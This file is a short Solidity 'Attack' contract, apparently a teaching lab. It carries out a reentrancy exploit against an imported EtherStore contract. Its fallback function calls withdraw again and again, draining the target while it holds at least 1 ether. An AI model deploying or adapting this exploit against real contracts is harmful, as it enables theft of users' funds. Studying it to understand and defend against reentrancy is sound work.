// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./a.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        // console.log("333");
        if (address(etherStore).balance >= 1 ether) {
            address payable sender = payable(address(this));
            etherStore.withdraw(sender);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        address payable sender = payable(address(this));
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(sender);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
